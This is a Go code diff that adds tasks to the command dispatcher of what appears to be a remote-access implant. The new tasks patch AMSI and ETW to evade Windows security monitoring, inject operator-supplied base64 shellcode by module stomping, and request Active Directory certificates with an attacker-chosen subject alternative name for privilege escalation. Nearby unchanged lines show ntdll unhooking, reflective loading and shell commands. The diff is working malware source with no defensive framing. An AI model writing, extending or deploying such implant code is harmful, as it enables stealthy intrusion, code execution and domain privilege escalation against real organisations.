@@ -248,6 +248,12 @@ func dispatchTask(t transport, task taskWire) {
 	case "HOOK_CHECK":
 		t.sendResult(task.ID, checkHooks(), "")
 
+	case "AMSI_BYPASS":
+		patchAMSI()
+		patchETW()
+		disableETWProcess()
+		t.sendResult(task.ID, "[+] AMSI/ETW re-patched", "")
+
 	case "NTDLL_UNHOOK":
 		unhookNtdll()
 		t.sendResult(task.ID, "[+] ntdll.dll re-mapped from disk", "")
@@ -729,6 +735,23 @@ func dispatchTask(t transport, task taskWire) {
 			errStr = err.Error()
 		}
 		t.sendResult(task.ID, out, errStr)
+
+	case "SHELLCODE_STOMP":
+		// Args JSON (optional): {"dll":"<target_dll_name>"} — omit for auto-pick
+		var sa struct {
+			DLL string `json:"dll"`
+		}
+		json.Unmarshal([]byte(task.Args), &sa)
+		if len(task.Payload) == 0 {
+			t.sendResult(task.ID, "", "SHELLCODE_STOMP: no shellcode payload")
+			return
+		}
+		scBytes, err := base64.StdEncoding.DecodeString(task.Payload)
+		if err != nil {
+			t.sendResult(task.ID, "", "SHELLCODE_STOMP: base64 decode: "+err.Error())
+			return
+		}
+		t.sendResult(task.ID, shellcodeStomp(scBytes, sa.DLL), "")
 
 	case "UDRL":
 		// Args JSON: {"payload":"<uploaded_filename>","host_dll":"<optional override>"}
@@ -1607,6 +1630,17 @@ func dispatchTask(t transport, task taskWire) {
 	case "NET_USE_DEL":
 		out, _ := runShell(fmt.Sprintf(`net use "%s" /delete /yes 2>&1`, strings.TrimSpace(task.Args)))
 		t.sendResult(task.ID, out, "")
+
+	case "ADCS_REQUEST":
+		var ar struct {
+			CA       string `json:"ca"`
+			Template string `json:"template"`
+			Subject  string `json:"subject"`
+			SAN      string `json:"san"`
+			Out      string `json:"out"`
+		}
+		json.Unmarshal([]byte(task.Args), &ar)
+		t.sendResult(task.ID, adcsRequest(ar.CA, ar.Template, ar.Subject, ar.SAN, ar.Out), "")
 
 	case "WHOAMI":
 		out, _ := runShell("whoami /all")
